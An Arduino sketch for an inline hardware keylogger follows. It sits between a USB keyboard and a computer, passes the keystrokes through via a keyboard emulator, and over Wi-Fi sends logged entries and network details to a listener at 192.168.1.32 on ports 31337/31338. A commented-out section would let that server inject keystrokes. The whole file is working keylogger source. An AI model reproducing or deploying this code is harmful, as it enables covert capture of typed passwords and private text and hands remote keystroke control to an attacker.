#include <LiquidCrystal.h>

#include <SPI.h>
#include <Adafruit_WINC1500.h>
#include "CircularBuffer.h"
#include "KeyboardHandler.h"
#include "keylogger.h"

// Define the WINC1500 board connections below.
// If you're following the Adafruit WINC1500 board
// guide you don't need to modify these:
#define WINC_CS   8
#define WINC_IRQ  7
#define WINC_RST  4
#define WINC_EN   2     // or, tie EN to VCC and comment this out
// The SPI pins of the WINC1500 (SCK, MOSI, MISO) should be
// connected to the hardware SPI port of the Arduino.
// On an Uno or compatible these are SCK = #13, MISO = #12, MOSI = #11.
// On an Arduino Zero use the 6-pin ICSP header, see:
//   https://www.arduino.cc/en/Reference/SPI

// Setup the WINC1500 connection with the pins above and the default hardware SPI.
Adafruit_WINC1500 WiFi(WINC_CS, WINC_IRQ, WINC_RST);

// Or just use hardware SPI (SCK/MOSI/MISO) and defaults, SS -> #10, INT -> #7, RST -> #5, EN -> 3-5V
//Adafruit_WINC1500 WiFi;

#define STAT_LED 13
char ssid[] = "xXSwaggernautsXx";     //  your network SSID (name)
char pass[] = "chillywilly";    // your network password (use for WPA, or use as key for WEP)
int keyIndex = 0;                // your network key Index number (needed only for WEP)

IPAddress host(192,168,1,32);
LiquidCrystal lcd(A5, A4, A3, A2, A1, A0);
//char host[] = "www.intense.io";
int port = 31337;
//char *debughost = host;
IPAddress debughost = host;
int debugport = 31338;

// Initialize the Ethernet client library
// with the IP address and port of the server
// that you want to connect to (port 80 is default for HTTP):
Adafruit_WINC1500Client client;
Adafruit_WINC1500Client debug;
KeyboardHandler handler;
CircularBuffer<char*> logBuffer;

uint32_t last_connect_attempt;
uint32_t last_transfer_attempt;
bool connect_in_progress;

uint16_t max_transfer_time = 50;
uint8_t command_buffer[128];
uint8_t last_modifiers = 0;
uint8_t keyboard_modifiers = 0;

void addToLog(char *output);

int line = 0;
int statch = 0;
char stat[] = "/|\-";

inline bool isConnected() {
  return WiFi.status() == WL_CONNECTED && client.connected();
}

void halt() {
  while(true) {
    digitalWrite(STAT_LED, HIGH);
    delay(100);
    digitalWrite(STAT_LED, LOW);
    delay(100);
  }
}

void setup() {

  lcd.begin(20,4);
  
  #ifdef WINC_EN
  pinMode(WINC_EN, OUTPUT);
  digitalWrite(WINC_EN, HIGH);
  #endif

  lcd.clear();
    lcd.setCursor(0, line++ % 3);
  lcd.print("Initializing");

  pinMode(STAT_LED, OUTPUT);
  digitalWrite(STAT_LED, HIGH);

  // Halt if no WiFi hardware installed
  if(WiFi.status() == WL_NO_SHIELD) {
    lcd.setCursor(0, line++ % 3);
    lcd.print("No shield");
    halt();
  }

    lcd.setCursor(0, line++ % 3);
  lcd.print("Init USB");
  handler.setLogCallback(addToLog);
  handler.init();

  // Begin serial communications with USB keyboard emulator
  Serial1.begin(9600);
  //Serial1.write(CMD_START);

  // Assumes WPA/WPA2 network, attempt to connect
  last_connect_attempt = millis();
  connect_in_progress = true;

  // Change below line if using unsecured or WEP network (not recommended)
  lcd.setCursor(0, line++ % 3);
  lcd.print("Begin connect");
  lcd.setCursor(0, 3);
  WiFi.beginAsync(ssid, pass);
}

void loop() {
  handler.task();
  WiFi.refresh();

  lcd.setCursor(19, 3);
  lcd.print(stat[statch++]);
  statch = statch % 4;
  
  // Attempt to connect/reconnect if disconnected
  switch(WiFi.status()) {
    case WL_CONNECTED:
      if(connect_in_progress && millis() - last_connect_attempt > 5000) {
        last_connect_attempt = millis();
        if(client.connect(host, port) && debug.connect(debughost, debugport)) {
          lcd.setCursor(0, line++ % 3);
          lcd.print("Connected");
          connect_in_progress = false;
          digitalWrite(STAT_LED, LOW);
          client.println("Keylogger");
          printWifiStatus();
          debug.println("Debug");
        }
      }
      break;
    case WL_IDLE_STATUS:
      if(connect_in_progress && millis() - last_connect_attempt < 30000) {
        // waiting for connection timeout, do nothing
        break;
      }
    default:
      lcd.setCursor(0, line++ % 3);
      lcd.print("Connection failed");
      digitalWrite(STAT_LED, HIGH);
      last_connect_attempt = millis();
      connect_in_progress = true;
      WiFi.beginAsync(ssid, pass);
  }
  
  last_transfer_attempt = millis();
  if(isConnected() && logBuffer.getNumEntries() > 0) {
    char *str = logBuffer.peek();
    size_t err = debug.writeAsync((uint8_t*)str, strlen(str));
    if(err >= 0) logBuffer.remove();
  }
  /*
  while(logBuffer.getNumEntries() > 0) {
    debug.write(logBuffer.removeFirst());
  }
  debug.flush();
  */
  /*
  // handle incoming commands from the server
  while(isConnected() && client.available() > 0 && millis() - last_transfer_attempt < max_transfer_time) {
    uint8_t command = client.read();
    switch(command) {
      case CMD_PRESS:
        Keyboard.press(client.read());
        break;
      case CMD_RELEASE:
        Keyboard.release(client.read());
        break;
    }
  }
  */
}


void printWifiStatus() {
  // print the SSID of the network you're attached to:
  client.print("SSID: ");
  client.println(WiFi.SSID());

  // print your WiFi shield's IP address:
  IPAddress ip = WiFi.localIP();
  client.print("IP Address: ");
  client.println(ip);

  // print the received signal strength:
  long rssi = WiFi.RSSI();
  client.print("signal strength (RSSI):");
  client.print(rssi);
  client.println(" dBm");
}

void controlKeysChanged() {
  uint8_t cmd = (uint8_t) (CMD_CHANGEMOD & 0xFF);
  Serial1.write(cmd);
  int key = handler.getModifiers();
  uint8_t buf[2];
  buf[0] = (uint8_t) ((key & 0xFF00) >> 8);
  buf[1] = (uint8_t) (key & 0xFF);
  Serial1.write(buf[0]);
  Serial1.write(buf[1]);
}

void keyPressed() {
  handler.pressed(handler.getOemKey() & 0xff);
  uint8_t cmd = (uint8_t) (CMD_PRESS & 0xFF);
  Serial1.write(cmd);
  int key = handler.getOemKey();
  uint8_t buf[2];
  buf[0] = (uint8_t) ((key & 0xFF00) >> 8);
  buf[1] = (uint8_t) (key & 0xFF);
  Serial1.write(buf[0]);
  Serial1.write(buf[1]);
}
void keyReleased() {
  handler.released(handler.getOemKey() & 0xff);
  uint8_t cmd = (uint8_t) (CMD_RELEASE & 0xFF);
  Serial1.write(cmd);
  int key = handler.getOemKey();
  uint8_t buf[2];
  buf[0] = (uint8_t) ((key & 0xFF00) >> 8);
  buf[1] = (uint8_t) (key & 0xFF);
  Serial1.write(buf[0]);
  Serial1.write(buf[1]);
}

void addToLog(char *output) {
  logBuffer.add(output);
}

